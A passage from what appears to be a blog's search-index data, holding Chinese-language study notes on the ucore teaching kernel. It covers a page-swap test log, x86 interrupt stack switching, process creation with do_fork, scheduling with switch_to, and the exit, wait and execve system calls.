fifo_check_swap\nwrite Virt Page d in fifo_check_swap\nwrite Virt Page b in fifo_check_swap\nwrite Virt Page e in fifo_check_swap\npage fault at 0x00005000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x1000 to disk swap entry 2\nwrite Virt Page b in fifo_check_swap\nwrite Virt Page a in fifo_check_swap\npage fault at 0x00001000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x2000 to disk swap entry 3\nswap_in: load disk swap entry 2 with swap_page in vadr 0x1000\nwrite Virt Page b in fifo_check_swap\npage fault at 0x00002000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x3000 to disk swap entry 4\nswap_in: load disk swap entry 3 with swap_page in vadr 0x2000\nwrite Virt Page c in fifo_check_swap\npage fault at 0x00003000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x4000 to disk swap entry 5\nswap_in: load disk swap entry 4 with swap_page in vadr 0x3000\nwrite Virt Page d in fifo_check_swap\npage fault at 0x00004000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x5000 to disk swap entry 6\nswap_in: load disk swap entry 5 with swap_page in vadr 0x4000\nwrite Virt Page e in fifo_check_swap\npage fault at 0x00005000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x1000 to disk swap entry 2\nswap_in: load disk swap entry 6 with swap_page in vadr 0x5000\nwrite Virt Page a in fifo_check_swap\npage fault at 0x00001000: K/R [no page found].\nswap_out: i 0, store page in vaddr 0x2000 to disk swap entry 3\nswap_in: load disk swap entry 2 with swap_page in vadr 0x1000\ncount is 0, total is 7\ncheck_swap() succeeded!\n</code></pre>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/","title":"ucore lab3 \u603b\u7ed3","text":"","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u76ee\u5f55","title":"\u76ee\u5f55","text":"<ol> <li>x86\u4e2d\u65ad/\u5f02\u5e38\u5904\u7406(tss\u548ctf\u4f5c\u7528)</li> <li>\u91cd\u8981\u51fd\u6570\u8bf4\u660e<ol> <li>\u521b\u5efa\u8fdb\u7a0b(\u7ebf\u7a0b)</li> <li>\u8c03\u5ea6\uff0c\u8fd0\u884c</li> <li>do_wait &amp; do_exit</li> <li>do_execve</li> <li>\u5176\u5b83\u7cfb\u7edf\u8c03\u7528</li> </ol> </li> <li>FAQ<ol> <li>\u4e00\u4e2a\u8fdb\u7a0b\u88ab\u521b\u5efa\u540e\u5982\u4f55\u5f00\u59cb\u6267\u884c\uff1f </li> <li>\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u5982\u679c\u56e0\u4e3a\u65f6\u95f4\u7247\u7528\u5b8c\u800c\u88ab\u8c03\u5ea6\u6389\u540e\uff0c\u518d\u6b21\u88ab\u8c03\u5ea6\u56de\u6765\u65f6\u4f1a\u4ece\u54ea\u91cc\u7ee7\u7eed\u6267\u884c\uff1f </li> <li>\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5b8c\u6574\u751f\u547d\u5468\u671f\uff1f </li> <li>fork\u8c03\u7528\uff0c\u4e3a\u4ec0\u4e48\u7236\u8fdb\u7a0b\u8fd4\u56de\u503c\u4e3apid\uff0c\u5b50\u8fdb\u7a0b\u8fd4\u56de\u503c\u4e3a0\uff08\u6d89\u53ca\u5230\u7528\u6237\u8fdb\u7a0b\u7684\u521b\u5efa\uff09</li> </ol> </li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>\u5b9e\u9a8c3\u6d89\u53ca\u5230\u7684\u77e5\u8bc6\u70b9\uff1a</p> <ol> <li>x86\u4e2d\u65ad\u4e2dtss\u7684\u4f5c\u7528\uff08\u7c7b\u4f3c\u7684\u5185\u6838\u6808\uff0c\u4e2d\u65ad\u5e27\u7684\u6982\u5ff5\uff09</li> <li>\u8fdb\u7a0b\u5982\u4f55\u521b\u5efa\u3001\u6267\u884c\u3001\u5207\u6362\uff08do_fork, do_wait, do_exit\u7b49\u7cfb\u7edf\u8c03\u7528\u7684\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\uff09</li> <li>\u7528\u6237\u8fdb\u7a0b\u7684\u521b\u5efa\u3001\u6267\u884c\u8fc7\u7a0b</li> <li>\u7528\u6237ulib\u5e93fork, wait, exit\u7684\u5b9e\u73b0</li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#x86\u4e2d\u65ad\u5f02\u5e38\u5904\u7406tss\u548ctf\u4f5c\u7528","title":"x86\u4e2d\u65ad/\u5f02\u5e38\u5904\u7406(tss\u548ctf\u4f5c\u7528)","text":"<p>p.s. \u89c1x86 manual Vol. 1 6-11</p> <p>If the code segment for the handler procedure has the same privilege level as the currently executing program or task, the handler procedure uses the current stack; if the handler executes at a more privileged level, the processor switches to the stack for the handler\u2019s privilege level.</p> <p>Call</p> <p>If no stack switch occurs, the processor does the following when calling an interrupt or exception handler (see Figure 6-5):</p> <ol> <li>Pushes the current contents of the EFLAGS, CS, and EIP registers (in that order) on the stack.</li> <li>Pushes an error code (if appropriate) on the stack.</li> <li>Loads the segment selector for the new code segment and the new instruction pointer (from the interrupt gate or trap gate) into the CS and EIP registers, respectively.</li> <li>If the call is through an interrupt gate, clears the IF flag in the EFLAGS register.</li> <li>Begins execution of the handler procedure.</li> </ol> <p>If a stack switch does occur, the processor does the following: 1. Temporarily saves (internally) the current contents of the SS, ESP, EFLAGS, CS, and EIP registers. 2. Loads the segment selector and stack pointer for the new stack (that is, the stack for the privilege level being called) from the TSS into the SS and ESP registers and switches to the new stack. 3. Pushes the temporarily saved SS, ESP, EFLAGS, CS, and EIP values for the interrupted procedure\u2019s stack onto the new stack. 4. Pushes an error code on the new stack (if appropriate). 5. Loads the segment selector for the new code segment and the new instruction pointer (from the interrupt gate or trap gate) into the CS and EIP registers, respectively. 6. If the call is through an interrupt gate, clears the IF flag in the EFLAGS register. 7. Begins execution of the handler procedure at the new privilege level.</p> <p>return</p> <p>A return from an interrupt or exception handler is initiated with the IRET instruction. The IRET instruction is similar to the far RET instruction, except that it also restores the contents of the EFLAGS register for the interrupted proce-dure. </p> <p>When executing a return from an interrupt or exception handler from the same privilege level as the inter-rupted procedure, the processor performs these actions:</p> <ol> <li>Restores the CS and EIP registers to their values prior to the interrupt or exception.</li> <li>Restores the EFLAGS register.</li> <li>Increments the stack pointer appropriately.</li> <li>Resumes execution of the interrupted procedure.</li> </ol> <p>When executing a return from an interrupt or exception handler from a different privilege level than the interrupted procedure, the processor performs these actions:</p> <ol> <li>Performs a privilege check.</li> <li>Restores the CS and EIP registers to their values prior to the interrupt or exception.</li> <li>Restores the EFLAGS register.</li> <li>Restores the SS and ESP registers to their values prior to the interrupt or exception, resulting in a stack switch back to the stack of the interrupted procedure.</li> <li>Resumes execution of the interrupted procedure.</li> </ol> <p></p> <p>\u603b\u7ed3\uff1a</p> <p>\u53d1\u751f\u4e2d\u65ad\uff0c\u65e0\u7279\u6743\u7ea7\u8f6c\u6362\u65f6\uff0c\u4f7f\u7528\u539f\u672c\u7684\u6808\u6765\u5b58\u50a8\u4e2d\u65ad\u5e27\u3002\u53d1\u751f\u7279\u6743\u7ea7\u8f6c\u6362\u65f6\uff08\u597d\u50cf\u53ea\u6709\u7528\u6237\u6001\u5230\u5185\u6838\u6001\uff09\uff0c\u4f7f\u7528\u5f53\u524d\u8fdb\u7a0btss\u4e2d\u7684ss0, esp0\u6240\u6307\u5411\u7684\u6808\uff08\u5185\u6838\u6808\uff09\u6765\u5b58\u50a8\u4e2d\u65ad\u5e27\uff0c\u4e14cpu\u4f1a\u5728\u4e2d\u65ad\u5e27\u4e2d\u989d\u5916\u5b58\u50a8\u5f53\u524d\u7684ss\u548cesp\u3002\uff08p.s. cpu\u901a\u8fc7\u6bd4\u8f83\u4e2d\u65ad\u5411\u91cf\u6307\u5411\u7684\u4e2d\u65ad\u63cf\u8ff0\u7b26\u548ccs\u5bc4\u5b58\u5668\u6765\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u7279\u6743\u7ea7\u7684\u8f6c\u6362\u3002\u800c\u6267\u884ciret\u65f6\uff0ccpu\u901a\u8fc7\u6bd4\u8f83\u6808\u4e2d\u7684cs\u548ccs\u5bc4\u5b58\u5668\u6765\u68c0\u6d4b\u662f\u5426\u9700\u8981\u7279\u6743\u7ea7\u7684\u8f6c\u6362\uff09</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u91cd\u8981\u51fd\u6570\u8bf4\u660e","title":"\u91cd\u8981\u51fd\u6570\u8bf4\u660e","text":"","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u521b\u5efa\u8fdb\u7a0b\u7ebf\u7a0b","title":"\u521b\u5efa\u8fdb\u7a0b(\u7ebf\u7a0b)","text":"<ol> <li>kernel_thread</li> </ol> <pre><code>int kernel_thread(int (*fn)(void *), void *arg, uint32_t clone_flags)\n</code></pre> <p>\u4f5c\u7528\uff1a\u521b\u5efa\u4e00\u4e2a\u5185\u6838\u7ebf\u7a0b\uff0c\u8be5\u7ebf\u7a0b\u5c06\u6267\u884cfn\u51fd\u6570\uff0c\u53c2\u6570\u4e3aarg\uff0cclone_flags\u63a7\u5236\u662f\u5426\u5171\u4eab\u7236\u8fdb\u7a0b\u5185\u5b58\uff0c\u8fd4\u56de\u7ebf\u7a0bpid\u3002</p> <p>\u5b9e\u73b0\uff1a</p> <ol> <li> <p>\u8bbe\u7f6etf</p> <p><pre><code>tf.tf_regs.reg_ebx = (uint32_t)fn;\ntf.tf_regs.reg_edx = (uint32_t)arg;\ntf.tf_eip = (uint32_t)kernel_thread_entry;\n</code></pre>   \u5176\u4e2dkernel_thread_entry\u5982\u4e0b\uff1a</p> <pre><code>kernel_thread_entry:        # void kernel_thread(void)\n\n    pushl %edx              # push arg\n    call *%ebx              # call fn\n\n    pushl %eax              # save the return value of fn(arg)\n    call do_exit            # call do_exit to terminate current thread\n</code></pre> <p>\u8bf4\u660e\uff1a</p> <ol> <li> <p>\u4e2d\u65ad\u5e27\u4e2d\u7684eip\u88ab\u8bbe\u7f6e\u4e3a\u4e86kernel_thread_entry\uff0c\u5982\u679c\u8ba9cpu\u6839\u636e\u8be5\u4e2d\u65ad\u5e27\u8fd4\u56de\uff0ccpu\u4fbf\u4f1a\u56de\u5230kernel_thread_entry\uff0c\u7136\u540e\u7531\u4e8e\u901a\u7528\u5bc4\u5b58\u5668ebx, edx\u4e5f\u5df2\u7ecf\u6062\u590d\u6210fn, arg\u7684\u503c\uff0c\u56e0\u800c\u53ef\u4ee5\u6210\u529f\u8c03\u7528fn\u51fd\u6570\u3002</p> </li> <li> <p>\u540e\u9762do_fork\u4e2d\u7684copy_thread\u51fd\u6570\u4f1a\u5c06\u8fdb\u7a0bcontext\u4e2d\u7684eip\u8bbe\u4e3aforkret\uff0c\u800cforkret\u4fbf\u4f1a\u8ba9\u8fdb\u7a0b\u4ece\u4e2d\u65ad\u5e27\u8fd4\u56de</p> </li> <li> <p>\u5f53\u8fdb\u7a0b\u7ed3\u675f\u65f6\u4f1a\u8c03\u7528do_exit</p> </li> </ol> </li> <li> <p>\u8c03\u7528do_fork</p> <pre><code>do_fork(clone_flags | CLONE_VM, 0, &amp;tf);\n</code></pre> </li> <li> <p>do_fork</p> </li> </ol> <pre><code>/* do_fork -     parent process for a new child process\n * @clone_flags: used to guide how to clone the child process\n * @stack:       the parent's user stack pointer. if stack==0, It means to fork a kernel thread.\n * @tf:          the trapframe info, which will be copied to child process's proc-&gt;tf\n */\nint\ndo_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf)\n</code></pre> <p>\u4f5c\u7528\uff1a\u4ece\u7236\u8fdb\u7a0b\u4ea7\u751f\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff08\u901a\u8fc7clone_flags\u6765\u63a7\u5236\u662f\u5426\u5171\u4eab\u5185\u5b58\uff09</p> <p>\u8bf4\u660e\uff1a\u76ee\u524d\u53ea\u7528\u4e8e\u5b9e\u73b0kernel_thread\u51fd\u6570\uff0c\u5982\u679c\u8981\u8ba9\u7528\u6237\u8fdb\u7a0b\u901a\u8fc7do_fork\u6765\u4ea7\u751f\u5b50\u8fdb\u7a0b\uff0c\u5e94\u8be5\u9700\u8981\u518d\u5c01\u88c5\u4e00\u4e2a\u7c7b\u4f3c\u4e8ekernel_thread\u7684\u51fd\u6570\uff0c\u5176\u4e2dtf.eip\u7684\u8bbe\u7f6e\u5c31\u4e0d\u4f1a\u7528kernel_thread_entry\u4e86\u3002</p> <p>\u5b9e\u73b0\uff1a</p> <pre><code>    //    1. call alloc_proc to allocate a proc_struct\n    //    2. call setup_kstack to allocate a kernel stack for child process (8KB)\n    //    3. call copy_mm to dup OR share mm according clone_flag\n    //    4. call copy_thread to setup tf &amp; context in proc_struct\n    //    5. insert proc_struct into hash_list &amp;&amp; proc_list\n    //    6. call wakeup_proc to make the new child process RUNNABLE\n //    7. set ret vaule using child proc's pid\n</code></pre> <ol> <li> <p>alloc_proc, \u5206\u914d\u4e00\u4e2apcb\u7ed3\u6784\u4f53</p> </li> <li> <p>setup_kstack, \u5206\u914d\u5185\u6838\u6808\u7a7a\u95f4(8KB)</p> </li> <li> <p>copy_mm, \u590d\u5236\u9875\u8868/\u5171\u4eab\u9875\u8868</p> <pre><code>static int\ncopy_mm(uint32_t clone_flags, struct proc_struct *proc) \n</code></pre> <p><code>clone_flags &amp; CLONE_VM</code>\u4e3a\u771f\u65f6\uff0cproc\u7684mm\u8bbe\u7f6e\u4e3acurrent-&gt;mm\uff0c\u5373\u548c\u5f53\u524d\u8fdb\u7a0b\u5171\u4eab\u5185\u5b58\u3002</p> <p>p.s. vma\u4e00\u81f4\uff0c\u56e0\u6b64\u8fdb\u7a0b\u6709\u6548\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u4e00\u81f4\u3002\u9875\u8868\u4e00\u81f4\uff0c\u56e0\u6b64\u8bbf\u95ee\u540c\u4e00\u4efd\u7269\u7406\u5730\u5740</p> <p>\u5426\u5219\uff0c\u590d\u5236\u5f53\u524d\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58(vma)\uff0c\u590d\u5236\u7269\u7406\u5185\u5b58\u5e76\u8bbe\u7f6e\u5bf9\u5e94\u7684\u9875\u8868\u3002\uff08\u590d\u5236\u4e86\u5f53\u524d\u8fdb\u7a0b\u7684\u5185\u5b58\uff09</p> <p>\u5b9e\u73b0\uff1a</p> <p>copy_mm</p> <p>-&gt; dup_mmap, \u8c03\u7528copy_range\u590d\u5236\u6bcf\u4e00\u4e2avma</p> <p>-&gt; copy_range, \u590d\u5236\u4e00\u6bb5\u865a\u62df\u5730\u5740\u5bf9\u5e94\u7684\u7269\u7406\u5185\u5b58\uff0c\u5e76\u8bbe\u7f6e\u9875\u8868</p> </li> <li> <p>copy_thread, \u8bbe\u7f6etf, context</p> <p>\u4e2d\u65ad\u5e27\u4f4d\u4e8e\u5185\u6838\u6808\u9876\u90e8</p> <pre><code>proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - 1;\n</code></pre> <p>\u8bbe\u7f6e\u7ebf\u7a0bcontext\u7684\u521d\u59cb\u72b6\u6001\uff0ceip\u8bbe\u7f6e\u4e3aforkret</p> <pre><code>proc-&gt;context.eip = (uintptr_t)forkret;\nproc-&gt;context.esp = (uintptr_t)(proc-&gt;tf); #\u66f4\u65b0\u6808\u9876\u4f4d\u7f6e\n</code></pre> </li> <li> <p>get_pid, \u8bbe\u7f6e\u8fdb\u7a0bpid</p> <p>hash_proc, \u5c06\u8fdb\u7a0b\u6dfb\u52a0\u5230\u54c8\u5e0c\u8868hash_list</p> <p>set_links, \u5c06\u8fdb\u7a0b\u6dfb\u52a0\u5230\u8fdb\u7a0b\u53cc\u5411\u94fe\u8868proc_list\uff0c\u5e76\u5c06\u8fdb\u7a0b\u8bbe\u7f6e\u4e3a\u5176\u7236\u8fdb\u7a0b\u6700\u5c0f\u7684\u5b50\u8fdb\u7a0bcptr</p> </li> <li> <p>wakeup_proc, \u5c06\u8fdb\u7a0b\u8bbe\u7f6e\u4e3arunnable</p> </li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u8c03\u5ea6\u8fd0\u884c","title":"\u8c03\u5ea6\uff0c\u8fd0\u884c","text":"<ol> <li>schedule</li> </ol> <pre><code>void schedule(void)\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u6309\u7167FIFO\u7684\u7b56\u7565\uff0c\u4ece\u8fdb\u7a0b\u94fe\u8868\u4e2d\u9009\u62e9\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u3002\u5982\u679c\u6ca1\u6709\u627e\u5230\u7684\u8bdd\uff0c\u6267\u884cidle\u8fdb\u7a0b\u3002</p> <ol> <li> <p>proc_run</p> <pre><code>void\nproc_run(struct proc_struct *proc)\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u5f00\u59cb\u8fd0\u884c\u4e00\u4e2a\u8fdb\u7a0b</p> <p>\u5b9e\u73b0:</p> <pre><code>current = proc; //\u8bbe\u7f6eproc\u4e3a\u5f53\u524d\u8fdb\u7a0b\n\n//kstack+KSTACKSIZE\u4e3a\u8fdb\u7a0b\u5185\u6838\u6808\u6808\u9876\uff0c\u8bbe\u7f6ets\u4e2d\u7684esp0\uff0c\u5f53\u4e2d\u65ad\u4e14\u5b58\u5728\u7279\u6743\u7ea7\u8f6c\u6362\u65f6\uff0c\u4f7f\u7528\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u3002\nload_esp0(next-&gt;kstack + KSTACKSIZE); \n\n//\u5207\u6362\u9875\u76ee\u5f55\u8868\u3002\u56e0\u4e3a\u5185\u6838\u4ee3\u7801\u4f4d\u4e8e0-4M\u4ee5\u5185\uff0c\u800c\u6240\u6709\u8fdb\u7a0b\u7684\u9875\u8868\u90fd\u5b58\u5728\u8be5\u6bb5\u5730\u5740\u7684\u6620\u5c04\uff0c\u56e0\u6b64\u5207\u6362\u540e\uff0c\u540e\u9762\u7684\u4ee3\u7801\u90fd\u662f\u80fd\u6b63\u5e38\u6267\u884c\u7684\nlcr3(next-&gt;cr3);\n\nswitch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));\n</code></pre> </li> <li> <p>switch_to</p> </li> </ol> <pre><code>switch_to:                      # switch_to(from, to)\n\n    # save from's registers\n    movl 4(%esp), %eax          # eax points to from\n    popl 0(%eax)                # save eip !popl\n    movl %esp, 4(%eax)\n    movl %ebx, 8(%eax)\n    movl %ecx, 12(%eax)\n    movl %edx, 16(%eax)\n    movl %esi, 20(%eax)\n    movl %edi, 24(%eax)\n    movl %ebp, 28(%eax)\n\n    # restore to's registers\n    movl 4(%esp), %eax          # not 8(%esp): popped return address already\n                                # eax now points to to\n    movl 28(%eax), %ebp\n    movl 24(%eax), %edi\n    movl 20(%eax), %esi\n    movl 16(%eax), %edx\n    movl 12(%eax), %ecx\n    movl 8(%eax), %ebx\n    movl 4(%eax), %esp\n\n    pushl 0(%eax)               # push eip\n\n    ret\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u4fdd\u5b58\u5f53\u524d\u4e0a\u4e0b\u6587\u5230\u5207\u6362\u524d\u8fdb\u7a0b(from)\u7684context\u4e2d\uff0c\u5e76\u6062\u590d\u5207\u6362\u540e\u8fdb\u7a0b(to)\u7684context</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#do_wait--do_exit","title":"do_wait &amp; do_exit","text":"<ol> <li>do_exit</li> </ol> <pre><code>// do_exit - called by sys_exit\n//   1. call exit_mmap &amp; put_pgdir &amp; mm_destroy to free the almost all memory space of process\n//   2. set process' state as PROC_ZOMBIE, then call wakeup_proc(parent) to ask parent reclaim itself.\n//   3. call scheduler to switch to other process\nint do_exit(int error_code)\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u91ca\u653e\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\uff0c\u5c06\u8fdb\u7a0b\u8bbe\u7f6e\u4e3aZOMBIE\u72b6\u6001\uff0c\u5e76\u5524\u9192\u7236\u7ebf\u7a0b\uff08\u8bbe\u7f6e\u4e3aRUNNABLE\uff09\uff0c\u7136\u540e\u8c03\u7528\u8c03\u5ea6\u5668\u3002</p> <p>\u5173\u952e\u4ee3\u7801\uff1a</p> <pre><code>lcr3(boot_cr3);\nif (mm_count_dec(mm) == 0) {\n    exit_mmap(mm);   //\u662fcopy_mm\u7684\u9006\u8fc7\u7a0b\uff0c\u91ca\u653e\u4e86\u7269\u7406\u5185\u5b58\u548c\u9875\u8868\n    put_pgdir(mm);   //\u91ca\u653e\u9875\u76ee\u5f55\u8868\n    mm_destroy(mm);  //\u91ca\u653evma\n}\ncurrent-&gt;mm = NULL;\n</code></pre> <p>\u5982\u679c\u8be5\u8fdb\u7a0b\u6709\u5b50\u8fdb\u7a0b\uff0c\u5219\u8fd8\u9700\u8981\u5c06\u5b50\u8fdb\u7a0b\u8bbe\u7f6e\u4e3ainit\u8fdb\u7a0b\u7684\u5b50\u8fdb\u7a0b\u3002</p> <ol> <li>do_wait</li> </ol> <pre><code>// do_wait - wait one OR any children with PROC_ZOMBIE state, and free memory space of kernel stack\n//         - proc struct of this child.\n// NOTE: only after do_wait function, all resources of the child proces are free.\nint\ndo_wait(int pid, int *code_store)\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u7b49\u5f85\u4e00\u4e2a\u6216\u4efb\u610f\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u6267\u884cdo_exit\u53d8\u4e3aZombie\u72b6\u6001\uff0c\u7136\u540e\u91ca\u653e\u5b50\u8fdb\u7a0b\u7684\u7ed3\u6784\u4f53</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#do_execve","title":"do_execve","text":"<ol> <li>do_execve</li> </ol> <pre><code>// do_execve - call exit_mmap(mm)&amp;put_pgdir(mm) to reclaim memory space of current process\n//           - call load_icode to setup new memory space accroding binary prog.\nint\ndo_execve(const char *name, size_t len, unsigned char *binary, size_t size)\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u6839\u636e\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u4e3a\u5f53\u524d\u8fdb\u7a0b\u8bbe\u7f6e\u65b0\u7684\u5185\u5b58\u7a7a\u95f4</p> <p>\u6ce8\u610f\u70b9\uff1a</p> <ol> <li> <p>\u5728lab3\u4e2d\uff0cuser_main\u8fdb\u7a0b\u662f\u901a\u8fc7kernel_thread\u521b\u5efa\u7684\uff0c\u6240\u4ee5\u521a\u5f00\u59cb\u662f\u4e00\u4e2a\u5185\u6838\u8fdb\u7a0b\u3002\u4f46\u901a\u8fc7sys_execve\u7cfb\u7edf\u8c03\u7528\u540e\uff0c\u65b0\u7684\u5185\u5b58\u7a7a\u95f4</p> </li> <li> <p>load_icode</p> </li> </ol> <p>\u4f5c\u7528\uff1a</p> <p>\u5c06ELF\u6587\u4ef6\u8bfb\u5230\u5185\u5b58\uff0c\u5e76\u4e3a\u5f53\u524d\u8fdb\u7a0b\u91cd\u65b0\u8bbe\u7f6e\u5185\u5b58\u7a7a\u95f4(mm\u865a\u62df\u5185\u5b58\uff0c\u9875\u8868)\u3002</p> <p>\u5e76\u4fee\u6539\u4e86\u5f53\u524d\u8fdb\u7a0b\u7684tf\u4e3a\uff1acs\u4e3a\u7528\u6237\u6bb5\uff0cesp\u4f7f\u7528\u7528\u6237\u6808\uff0ceip\u4e3aelf-&gt;entry</p> <pre><code>tf-&gt;tf_cs = USER_CS;\ntf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;\ntf-&gt;tf_esp = USTACKTOP;\ntf-&gt;tf_eip = elf-&gt;e_entry;\ntf-&gt;tf_eflags = FL_IF;\n</code></pre>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u5176\u5b83\u7cfb\u7edf\u8c03\u7528","title":"\u5176\u5b83\u7cfb\u7edf\u8c03\u7528","text":"<ol> <li>do_yeild</li> </ol> <p>\u8fdb\u884c\u4e00\u6b21\u8fdb\u7a0b\u8c03\u5ea6\uff08\u901a\u8fc7\u8bbe\u7f6eneed_reschedule\uff09</p> <ol> <li>do_kill</li> </ol> <p>\u5c06\u8fdb\u7a0bFlag\u8bbe\u7f6e\u4e3aPF_EXITING\uff0c\u5f53switch_to\u5230\u8be5\u8fdb\u7a0b\u540e\u4f1a\u89e6\u53d1do_exit(KILLED)</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#faq","title":"FAQ","text":"<ol> <li>\u4e00\u4e2a\u8fdb\u7a0b\u88ab\u521b\u5efa\u540e\u5982\u4f55\u5f00\u59cb\u6267\u884c\uff1f</li> </ol> <p>\u7b54\uff1a</p> <ol> <li>\u901a\u8fc7kernel_thread\u521b\u5efa\u7684\u5185\u6838\u8fdb\u7a0b\u3002kernel_thread\u8c03\u7528do_fork\uff08\u5206\u914d\u5185\u6838\u6808\uff0c\u5185\u5b58\u7a7a\u95f4\uff09\u540e\uff0c\u8fdb\u7a0b\u72b6\u6001\u4e3aRunnable\uff0c\u5f53\u88ab\u8c03\u5ea6\u5668\u8c03\u5ea6\u5230\u65f6(schedule)\uff0c\u4f1a\u901a\u8fc7proc_run -&gt; switch_to\u8fdb\u884c\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u800c\u7531\u4e8e\u8fdb\u7a0b\u7684\u521d\u59cb\u4e0a\u4e0b\u6587(context)\u7684eip\u88ab\u8bbe\u7f6e\u4e3a\u4e86forkret\uff0c\u4e8e\u662f\u4f1a\u4eceforkret\u5f00\u59cb\u6267\u884c\uff0cforkret\u4f1a\u6267\u884c\u4e2d\u65ad\u8fd4\u56de\u7684\u4ee3\u7801\uff0ciret\u5230kernel_thread_entry\u5904\u5f00\u59cb\u6267\u884c\uff0c\u4ece\u800c\u6267\u884c\u8fdb\u7a0b\u7684\u51fd\u6570\u4ee3\u7801\u3002</li> <li>\u7528\u6237\u8fdb\u7a0b\u53c2\u8003FAQ#4</li> <li> <p>\u8fdb\u7a0b\u8c03\u7528do_execve\u540e\u4f1a\u91cd\u65b0\u5206\u914d\u5185\u5b58\u7a7a\u95f4\uff0c\u91cd\u65b0\u8bbe\u7f6etf(eip\u4e3aelf-&gt;entry)\uff0c\u91cd\u65b0\u5f00\u59cb\u6267\u884c\u3002</p> </li> <li> <p>\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u5982\u679c\u56e0\u4e3a\u65f6\u95f4\u7247\u7528\u5b8c\u800c\u88ab\u8c03\u5ea6\u6389\u540e\uff0c\u518d\u6b21\u88ab\u8c03\u5ea6\u56de\u6765\u65f6\u4f1a\u4ece\u54ea\u91cc\u7ee7\u7eed\u6267\u884c\uff1f</p> </li> </ol> <p>\u5f53CPU\u9047\u5230\u4e2d\u65ad\u540e\uff0c\u4f1a\u8fdb\u5165\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\uff08vector.S -&gt; __all_traps -&gt; trap() -&gt; trap_dispatch() -&gt; \u5f02\u5e38\u5904\u7406 -&gt; \u8fd4\u56de\u5230trap_ret -&gt; \u4e2d\u65ad\u8fd4\u56de\uff09\uff0cucore\u5bf9\u4e8e\u65f6\u949f\u4e2d\u65ad\u7684\u5904\u7406\u662f\u5c06\u5f53\u524d\u7684\u8fdb\u7a0b\u8bbe\u7f6e\u4e3aneed_resched\uff0c\u4ece\u800c\u5728trap()\u4e2d\u4f1a\u8c03\u7528schedule()\u3002</p> <p>\u4e2d\u65ad\u65f6\uff0c\u8fdb\u7a0b\u7684\u201c\u7528\u6237\u6001\u4e0a\u4e0b\u6587\u201d\u88ab\u5b58\u5165\u4e2d\u65ad\u5e27\u4e2d\uff08\u8be5\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u6808\u9876\uff1b\u5176\u4e2d\u4e00\u90e8\u5206\u7531\u786c\u4ef6\u5b8c\u6210\u5982cs, eip, 